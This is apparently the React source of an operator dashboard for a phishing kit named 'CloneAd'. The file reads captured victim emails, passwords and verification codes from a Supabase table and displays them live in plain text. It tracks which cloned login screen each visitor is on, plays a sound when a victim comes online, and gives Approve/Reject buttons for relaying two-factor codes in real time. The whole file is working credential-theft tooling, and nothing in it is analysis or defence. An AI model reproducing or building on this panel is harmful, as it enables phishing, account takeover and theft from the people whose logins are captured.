import { Fragment, useEffect, useMemo, useRef, useState } from "react";
import { Link } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/contexts/AuthContext";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Check, X, Loader2, LogOut, ShieldCheck, Trash2, Mail, KeyRound, Hash, Sparkles, Activity, History, Radio, Volume2, VolumeX, Monitor } from "lucide-react";
import { toast } from "sonner";
import { ADMIN_BASE } from "@/lib/admin-route";
import { subscribeToOnlineVisitors } from "@/lib/presence";

interface LeadRow {
  id: string;
  ad_id: string;
  session_id: string;
  field_name: string;
  value: string;
  user_agent: string | null;
  created_at: string;
}

interface ActionRow {
  session_id: string;
  ad_id: string;
  action: string;
  created_at: string;
}

interface AttemptRow {
  key: string;
  session_id: string;
  ad_id: string;
  email: string;
  password: string;
  code: string;
  codeAt: string;
  status: "pending" | "approve" | "reject";
}

interface ActiveSession {
  session_id: string;
  ad_id: string;
  email: string;
  password: string;
  user_agent: string | null;
  lastActivity: string;
}

const TRACKED = ["email_submitted", "password_submitted", "code_submitted"] as const;

function formatTime(iso: string): string {
  const d = new Date(iso);
  return d.toLocaleString("pt-BR", {
    day: "2-digit",
    month: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

/** Mapeia o `kind` da tela (vindo da presença) pra um rótulo amigável. */
function screenKindLabel(kind: string): string {
  switch (kind) {
    case "main":
      return "Tela home";
    case "access-account":
      return "Tela acessar";
    case "password":
      return "Tela senha";
    case "email-code":
      return "Tela código";
    case "forgot-password":
      return "Tela esqueci senha";
    case "passwordless":
      return "Tela sem senha";
    case "reactivate":
      return "Tela reativar";
    default:
      return kind;
  }
}

function deviceLabel(ua: string | null): string {
  if (!ua) return "—";
  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
  if (/Android/i.test(ua)) return "Android";
  if (/Windows/i.test(ua)) return "Windows";
  if (/Mac OS/i.test(ua)) return "Mac";
  if (/Linux/i.test(ua)) return "Linux";
  return "Web";
}

/** Som de entrada de visitante (transição offline→online). */
function playOnlineDing() {
  try {
    const Ctx = (window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext);
    if (!Ctx) return;
    const ctx = new Ctx();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "triangle";
    osc.frequency.setValueAtTime(520, ctx.currentTime);
    osc.frequency.linearRampToValueAtTime(780, ctx.currentTime + 0.18);
    gain.gain.setValueAtTime(0.0001, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.3, ctx.currentTime + 0.02);
    gain.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.5);
    osc.connect(gain).connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.55);
    setTimeout(() => ctx.close().catch(() => {}), 800);
  } catch { /* silencioso */ }
}

export default function Dashboard() {
  const { user, signOut } = useAuth();
  const [leads, setLeads] = useState<LeadRow[]>([]);
  const [actions, setActions] = useState<ActionRow[]>([]);
  const [busy, setBusy] = useState<string | null>(null);
  const [pulse, setPulse] = useState(false);
  const [soundOn, setSoundOn] = useState(true);
  const soundOnRef = useRef(true);
  useEffect(() => {
    soundOnRef.current = soundOn;
  }, [soundOn]);

  /** Sessões com aba aberta + visível agora. */
  const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
  /** Tela atual em tempo real por sessão (vinda do canal de presença). */
  const [liveScreens, setLiveScreens] = useState<Map<string, string>>(new Map());

  // Destrava AudioContext no primeiro clique (necessário pra tocar som depois sem gesto)
  useEffect(() => {
    const unlock = () => {
      try {
        const Ctx = (window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext);
        if (!Ctx) return;
        const ctx = new Ctx();
        const buffer = ctx.createBuffer(1, 1, 22050);
        const src = ctx.createBufferSource();
        src.buffer = buffer;
        src.connect(ctx.destination);
        src.start(0);
        setTimeout(() => ctx.close().catch(() => {}), 200);
      } catch { /* ignore */ }
    };
    window.addEventListener("pointerdown", unlock, { once: true });
    window.addEventListener("keydown", unlock, { once: true });
    return () => {
      window.removeEventListener("pointerdown", unlock);
      window.removeEventListener("keydown", unlock);
    };
  }, []);

  // Subscreve presença global de visitantes
  useEffect(() => {
    if (!user) return;
    const off = subscribeToOnlineVisitors(
      (map) => {
        const ids = new Set(map.keys());
        setOnlineSessionIds(ids);
        const screens = new Map<string, string>();
        for (const [sid, meta] of map) {
          if (meta.screenKind) screens.set(sid, meta.screenKind);
        }
        setLiveScreens(screens);
      },
      (sessionId) => {
        // Cada JOIN = transição offline→online de uma sessão.
        // Toca som SEMPRE, mesmo se a mesma sessão entrar/sair várias vezes.
        console.info("[Dashboard] visitante online:", sessionId);
        if (soundOnRef.current) {
          playOnlineDing();
        }
        setPulse(true);
        setTimeout(() => setPulse(false), 600);
      },
    );
    return off;
  }, [user]);

  useEffect(() => {
    document.title = "Painel — CloneAd";
  }, []);

  // Carrega leads + realtime
  useEffect(() => {
    if (!user) return;
    let alive = true;
    supabase
      .from("ad_leads")
      .select("id, ad_id, session_id, field_name, value, user_agent, created_at")
      .in("field_name", TRACKED as unknown as string[])
      .order("created_at", { ascending: false })
      .limit(1000)
      .then(({ data }) => {
        if (!alive) return;
        setLeads((data ?? []) as LeadRow[]);
      });

    const ch = supabase
      .channel("dash-leads")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_leads" },
        (payload) => {
          const r = payload.new as LeadRow;
          if (!TRACKED.includes(r.field_name as typeof TRACKED[number])) return;
          setLeads((prev) => [r, ...prev]);
          setPulse(true);
          setTimeout(() => setPulse(false), 600);
        },
      )
      .on(
        "postgres_changes",
        { event: "DELETE", schema: "public", table: "ad_leads" },
        (payload) => {
          const old = payload.old as { id: string };
          setLeads((prev) => prev.filter((r) => r.id !== old.id));
        },
      )
      .subscribe();

    return () => {
      alive = false;
      supabase.removeChannel(ch);
    };
  }, [user]);

  // Carrega ações (approve/reject) + realtime
  useEffect(() => {
    if (!user) return;
    let alive = true;
    supabase
      .from("ad_session_actions")
      .select("session_id, ad_id, action, created_at")
      .order("created_at", { ascending: false })
      .limit(1000)
      .then(({ data }) => {
        if (!alive) return;
        setActions((data ?? []) as ActionRow[]);
      });

    const ch = supabase
      .channel("dash-actions")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_session_actions" },
        (payload) => setActions((prev) => [payload.new as ActionRow, ...prev]),
      )
      .subscribe();

    return () => {
      alive = false;
      supabase.removeChannel(ch);
    };
  }, [user]);

  // Computa tentativas (1 linha por código submetido), com status pendente/aprovado/rejeitado
  const attempts: AttemptRow[] = useMemo(() => {
    const bySession = new Map<string, LeadRow[]>();
    for (const l of leads) {
      const arr = bySession.get(l.session_id) || [];
      arr.push(l);
      bySession.set(l.session_id, arr);
    }

    const sessionActions = new Map<string, ActionRow[]>();
    for (const a of actions) {
      if (a.action !== "approve" && a.action !== "reject") continue;
      const arr = sessionActions.get(a.session_id) || [];
      arr.push(a);
      sessionActions.set(a.session_id, arr);
    }

    const rows: AttemptRow[] = [];
    for (const [sid, items] of bySession) {
      const codes = [...items]
        .filter((i) => i.field_name === "code_submitted")
        .sort((a, b) => a.created_at.localeCompare(b.created_at));
      const acts = (sessionActions.get(sid) || []).slice().sort((a, b) =>
        a.created_at.localeCompare(b.created_at),
      );
      const codeStatus = new Map<string, "approve" | "reject">();
      for (const a of acts) {
        for (let i = codes.length - 1; i >= 0; i--) {
          const c = codes[i];
          const key = `${c.created_at}-${c.value}`;
          if (!codeStatus.has(key) && c.created_at <= a.created_at) {
            codeStatus.set(key, a.action as "approve" | "reject");
            break;
          }
        }
      }

      for (const c of codes) {
        const emailRow = [...items]
          .filter((i) => i.field_name === "email_submitted" && i.created_at <= c.created_at)
          .sort((a, b) => a.created_at.localeCompare(b.created_at))
          .pop();
        const passwordRow = [...items]
          .filter((i) => i.field_name === "password_submitted" && i.created_at <= c.created_at)
          .sort((a, b) => a.created_at.localeCompare(b.created_at))
          .pop();
        const key = `${c.created_at}-${c.value}-${sid}`;
        rows.push({
          key,
          session_id: sid,
          ad_id: c.ad_id,
          email: emailRow?.value || "—",
          password: passwordRow?.value || "—",
          code: c.value,
          codeAt: c.created_at,
          status: codeStatus.get(`${c.created_at}-${c.value}`) || "pending",
        });
      }
    }

    return rows.sort((a, b) => b.codeAt.localeCompare(a.codeAt));
  }, [leads, actions]);

  const pendingCount = attempts.filter((a) => a.status === "pending").length;
  const approvedCount = attempts.filter((a) => a.status === "approve").length;
  const rejectedCount = attempts.filter((a) => a.status === "reject").length;

  // Última tentativa pendente por sessão = a única acionável (a "ao vivo").
  // As anteriores da mesma sessão viram "ignorado" e descem pro histórico.
  const actionableKeys = useMemo(() => {
    const latestPerSession = new Map<string, AttemptRow>();
    for (const a of attempts) {
      if (a.status !== "pending") continue;
      const cur = latestPerSession.get(a.session_id);
      if (!cur || a.codeAt > cur.codeAt) latestPerSession.set(a.session_id, a);
    }
    return new Set(Array.from(latestPerSession.values()).map((a) => a.key));
  }, [attempts]);

  // Separa em "ao vivo" (acionáveis) e "histórico" (resto)
  const live = attempts.filter((a) => actionableKeys.has(a.key));
  const history = attempts.filter((a) => !actionableKeys.has(a.key));

  // Sessões em andamento: têm e-mail mas não têm tentativa pendente acionável.
  // (Quem já tá em "Ao vivo" sai daqui pra evitar duplicar.)
  const activeSessions: ActiveSession[] = useMemo(() => {
    const bySession = new Map<string, LeadRow[]>();
    for (const l of leads) {
      const arr = bySession.get(l.session_id) || [];
      arr.push(l);
      bySession.set(l.session_id, arr);
    }
    const out: ActiveSession[] = [];
    for (const [sid, items] of bySession) {
      const emails = items.filter((i) => i.field_name === "email_submitted");
      if (emails.length === 0) continue;
      const sorted = [...items].sort((a, b) => a.created_at.localeCompare(b.created_at));
      const lastActivity = sorted[sorted.length - 1].created_at;
      // Mostra a sessão se a última atividade foi e-mail ou senha.
      // Se foi código, só mostra se NÃO houver tentativa pendente nem ação dela
      // (ou seja, só pra sessões que voltaram a digitar e-mail depois).
      const lastField = sorted[sorted.length - 1].field_name;
      if (lastField === "code_submitted") continue;
      const email = [...emails].sort((a, b) => a.created_at.localeCompare(b.created_at)).pop()!.value;
      const passwordRow = [...items]
        .filter((i) => i.field_name === "password_submitted")
        .sort((a, b) => a.created_at.localeCompare(b.created_at))
        .pop();
      out.push({
        session_id: sid,
        ad_id: items[0].ad_id,
        email,
        password: passwordRow?.value || "—",
        user_agent: items.find((i) => i.user_agent)?.user_agent ?? null,
        lastActivity,
      });
    }
    return out.sort((a, b) => b.lastActivity.localeCompare(a.lastActivity));
  }, [leads]);

  const send = async (row: AttemptRow, action: "approve" | "reject") => {
    setBusy(`${row.key}-${action}`);
    const { error } = await supabase.from("ad_session_actions").insert({
      ad_id: row.ad_id,
      session_id: row.session_id,
      action,
      payload: action === "reject" ? { message: "Código inválido" } : null,
    });
    setBusy(null);
    if (error) return toast.error(error.message);
    toast.success(action === "approve" ? "Aprovado" : "Rejeitado");
  };

  const handleClearAll = async () => {
    if (!confirm("Apagar TODOS os leads capturados? Essa ação é permanente.")) return;
    const { error } = await supabase
      .from("ad_leads")
      .delete()
      .in("field_name", TRACKED as unknown as string[]);
    if (error) return toast.error(error.message);
    setLeads([]);
    toast.success("Histórico limpo");
  };

  return (
    <div className="min-h-screen bg-background">
      <header className="sticky top-0 z-30 border-b border-border bg-background/80 backdrop-blur-xl">
        <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-6">
          <Link to={ADMIN_BASE} className="flex items-center gap-2">
            <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-gradient-primary shadow-glow">
              <ShieldCheck className="h-4 w-4 text-primary-foreground" />
            </div>
            <span className="text-lg font-bold tracking-tight">Painel</span>
            <span
              className={`ml-2 inline-flex h-2 w-2 rounded-full ${onlineSessionIds.size > 0 ? "bg-success" : "bg-destructive"} ${pulse ? "animate-ping" : ""}`}
              aria-label={onlineSessionIds.size > 0 ? "Visitantes online" : "Ninguém online"}
            />
          </Link>
          <div className="flex items-center gap-3">
            <span className="hidden text-xs text-muted-foreground sm:inline">{user?.email}</span>
            <Button
              variant="ghost"
              size="icon"
              onClick={() => setSoundOn((v) => !v)}
              aria-label={soundOn ? "Silenciar notificações" : "Ativar notificações"}
              title={soundOn ? "Som ligado — clique pra silenciar" : "Som desligado — clique pra ativar"}
            >
              {soundOn ? <Volume2 className="h-4 w-4" /> : <VolumeX className="h-4 w-4 text-muted-foreground" />}
            </Button>
            <Button variant="ghost" size="sm" onClick={signOut}>
              <LogOut className="mr-2 h-4 w-4" /> Sair
            </Button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-7xl px-6 py-8">
        {/* Cards de resumo */}
        <div className="grid grid-cols-2 gap-4 sm:grid-cols-4">
          <StatCard label="Em andamento" value={activeSessions.length} icon={<Sparkles className="h-4 w-4" />} highlight={activeSessions.length > 0} />
          <StatCard label="Ao vivo" value={live.length} icon={<Radio className="h-4 w-4" />} highlight={live.length > 0} />
          <StatCard label="Aprovados" value={approvedCount} icon={<Check className="h-4 w-4" />} />
          <StatCard label="Rejeitados" value={rejectedCount} icon={<X className="h-4 w-4" />} />
        </div>

        {/* SESSÕES EM ANDAMENTO */}
        <section className="mt-8 rounded-xl border border-border bg-card shadow-card">
          <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
            <div className="flex items-center gap-2">
              <Sparkles className="h-4 w-4 text-primary" />
              <h2 className="text-base font-semibold">Sessões em andamento</h2>
              <Badge variant="secondary" className="text-[10px]">{activeSessions.length}</Badge>
            </div>
          </div>

          {activeSessions.length === 0 ? (
            <div className="flex flex-col items-center gap-3 px-6 py-10 text-center">
              <p className="text-sm text-muted-foreground">
                Ninguém digitando agora. Quando alguém preencher o e-mail, aparece aqui.
              </p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
                  <tr>
                    <th className="px-4 py-3 text-left font-medium">Status</th>
                    <th className="px-4 py-3 text-left font-medium">Última atividade</th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1"><Mail className="h-3 w-3" /> E-mail</span>
                    </th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1"><KeyRound className="h-3 w-3" /> Senha</span>
                    </th>
                    <th className="px-4 py-3 text-left font-medium">
                      <span className="inline-flex items-center gap-1"><Monitor className="h-3 w-3" /> Tela atual</span>
                    </th>
                    <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
                  </tr>
                </thead>
                <tbody>
                  {activeSessions.map((s) => {
                    const hasPassword = s.password !== "—";
                    const isOnline = onlineSessionIds.has(s.session_id);
                    const liveKind = liveScreens.get(s.session_id);
                    // Tela em tempo real (vinda da presença) tem prioridade;
                    // se a sessão está offline, cai pra inferência baseada em dados.
                    const screenLabel = liveKind
                      ? screenKindLabel(liveKind)
                      : hasPassword
                        ? "Tela código"
                        : "Tela escolha";
                    return (
                      <tr key={s.session_id} className="border-t border-border hover:bg-muted/30">
                        <td className="whitespace-nowrap px-4 py-3 text-xs">
                          <StatusDot online={isOnline} />
                        </td>
                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                          {formatTime(s.lastActivity)}
                        </td>
                        <td className="break-all px-4 py-3 font-mono text-xs">{s.email}</td>
                        <td className="break-all px-4 py-3 font-mono text-xs">
                          {hasPassword ? s.password : <span className="text-muted-foreground">—</span>}
                        </td>
                        <td className="whitespace-nowrap px-4 py-3 text-xs">
                          <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
                            {screenLabel}
                          </span>
                        </td>
                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">
                          {deviceLabel(s.user_agent)}
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </section>

        {/* AO VIVO */}
        {live.length > 0 && (
          <section className="mt-8 rounded-xl border border-primary/30 bg-card shadow-glow">
            <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
              <div className="flex items-center gap-2">
                <span className="relative flex h-2.5 w-2.5">
                  <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-75" />
                  <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-success" />
                </span>
                <h2 className="text-base font-semibold">Ao vivo</h2>
                <Badge variant="secondary" className="text-[10px]">{live.length}</Badge>
              </div>
            </div>
            <AttemptsTable
              rows={live}
              leads={leads}
              actionable
              busy={busy}
              onAction={send}
              onlineSessionIds={onlineSessionIds}
              liveScreens={liveScreens}
            />
          </section>
        )}

        {/* HISTÓRICO */}
        <section className="mt-6 rounded-xl border border-border bg-card shadow-card">
          <div className="flex items-center justify-between gap-2 border-b border-border px-5 py-4">
            <div className="flex items-center gap-2">
              <History className="h-4 w-4 text-muted-foreground" />
              <h2 className="text-base font-semibold">Histórico</h2>
              <Badge variant="secondary" className="text-[10px]">{history.length}</Badge>
            </div>
            {history.length > 0 && (
              <Button
                size="sm"
                variant="ghost"
                onClick={handleClearAll}
                className="h-8 text-xs text-muted-foreground hover:text-destructive"
              >
                <Trash2 className="mr-1 h-3 w-3" />
                Limpar tudo
              </Button>
            )}
          </div>

          {history.length === 0 ? (
            <div className="flex flex-col items-center gap-3 px-6 py-12 text-center">
              <div className="flex h-12 w-12 items-center justify-center rounded-full bg-muted">
                <History className="h-5 w-5 text-muted-foreground" />
              </div>
              <p className="text-sm text-muted-foreground">
                Quando você aprovar, rejeitar ou um novo código chegar, as tentativas antigas aparecem aqui.
              </p>
            </div>
          ) : (
            <AttemptsTable
              rows={history}
              leads={leads}
              actionable={false}
              busy={busy}
              onAction={send}
              onlineSessionIds={onlineSessionIds}
              liveScreens={liveScreens}
            />
          )}
        </section>
      </main>
    </div>
  );
}

function StatCard({
  label,
  value,
  icon,
  highlight,
}: {
  label: string;
  value: number;
  icon: React.ReactNode;
  highlight?: boolean;
}) {
  return (
    <div
      className={`rounded-xl border bg-card p-4 shadow-card transition ${
        highlight ? "border-primary/40 shadow-glow" : "border-border"
      }`}
    >
      <div className="flex items-center justify-between">
        <span className="text-xs uppercase tracking-wide text-muted-foreground">{label}</span>
        <span className={`flex h-7 w-7 items-center justify-center rounded-lg ${highlight ? "bg-primary/15 text-primary" : "bg-muted text-muted-foreground"}`}>
          {icon}
        </span>
      </div>
      <div className="mt-2 text-2xl font-bold tracking-tight">{value}</div>
    </div>
  );
}

function StatusDot({ online }: { online: boolean }) {
  if (online) {
    return (
      <span className="inline-flex items-center gap-1.5 text-success">
        <span className="relative flex h-2 w-2">
          <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-success opacity-75" />
          <span className="relative inline-flex h-2 w-2 rounded-full bg-success" />
        </span>
        <span className="text-[11px] font-medium">online</span>
      </span>
    );
  }
  return (
    <span className="inline-flex items-center gap-1.5 text-muted-foreground">
      <span className="h-2 w-2 rounded-full bg-muted-foreground/40" />
      <span className="text-[11px]">offline</span>
    </span>
  );
}

function AttemptsTable({
  rows,
  leads,
  actionable,
  busy,
  onAction,
  onlineSessionIds,
  liveScreens,
}: {
  rows: AttemptRow[];
  leads: LeadRow[];
  actionable: boolean;
  busy: string | null;
  onAction: (row: AttemptRow, action: "approve" | "reject") => void;
  onlineSessionIds: Set<string>;
  liveScreens: Map<string, string>;
}) {
  return (
    <div className="overflow-x-auto">
      <table className="w-full text-sm">
        <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
          <tr>
            {actionable && <th className="px-4 py-3 text-left font-medium">Status</th>}
            <th className="px-4 py-3 text-left font-medium">Hora</th>
            <th className="px-4 py-3 text-left font-medium">
              <span className="inline-flex items-center gap-1">
                <Mail className="h-3 w-3" /> E-mail
              </span>
            </th>
            <th className="px-4 py-3 text-left font-medium">
              <span className="inline-flex items-center gap-1">
                <KeyRound className="h-3 w-3" /> Senha
              </span>
            </th>
            <th className="px-4 py-3 text-left font-medium">
              <span className="inline-flex items-center gap-1">
                <Hash className="h-3 w-3" /> Código
              </span>
            </th>
            <th className="px-4 py-3 text-left font-medium">
              <span className="inline-flex items-center gap-1">
                <Monitor className="h-3 w-3" /> Tela
              </span>
            </th>
            <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
          </tr>
        </thead>
        <tbody>
          {rows.map((row) => {
            const ua = leads.find((l) => l.session_id === row.session_id)?.user_agent ?? null;
            const isOnline = onlineSessionIds.has(row.session_id);
            const liveKind = liveScreens.get(row.session_id);
            const screenLabel = liveKind ? screenKindLabel(liveKind) : "Tela código";
            return (
              <Fragment key={row.key}>
              <tr
                className={`border-t border-border transition-colors ${
                  actionable ? "bg-primary/5" : "hover:bg-muted/30"
                }`}
              >
                {actionable && (
                  <td className="whitespace-nowrap px-4 py-3 text-xs">
                    <StatusDot online={isOnline} />
                  </td>
                )}
                <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                  {formatTime(row.codeAt)}
                </td>
                <td className="break-all px-4 py-3 font-mono text-xs">{row.email}</td>
                <td className="break-all px-4 py-3 font-mono text-xs">{row.password}</td>
                <td className="px-4 py-3 font-mono text-sm tracking-widest">{row.code}</td>
                <td className="whitespace-nowrap px-4 py-3 text-xs">
                  <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
                    {screenLabel}
                  </span>
                </td>
                <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">{deviceLabel(ua)}</td>
              </tr>
              {actionable && (
                <tr className="bg-primary/5">
                  <td colSpan={7} className="px-4 pb-4 pt-0">
                    <div className="flex gap-2">
                      <Button
                        size="sm"
                        className="h-11 flex-1 bg-success text-success-foreground hover:bg-success/90"
                        onClick={() => onAction(row, "approve")}
                        disabled={busy === `${row.key}-approve`}
                      >
                        {busy === `${row.key}-approve` ? (
                          <Loader2 className="h-4 w-4 animate-spin" />
                        ) : (
                          <>
                            <Check className="mr-1.5 h-4 w-4" /> Aprovar
                          </>
                        )}
                      </Button>
                      <Button
                        size="sm"
                        variant="outline"
                        className="h-11 flex-1 border-destructive/40 text-destructive hover:bg-destructive/10"
                        onClick={() => onAction(row, "reject")}
                        disabled={busy === `${row.key}-reject`}
                      >
                        {busy === `${row.key}-reject` ? (
                          <Loader2 className="h-4 w-4 animate-spin" />
                        ) : (
                          <>
                            <X className="mr-1.5 h-4 w-4" /> Rejeitar
                          </>
                        )}
                      </Button>
                    </div>
                  </td>
                </tr>
              )}
              </Fragment>
            );
          })}
        </tbody>
      </table>
    </div>
  );
}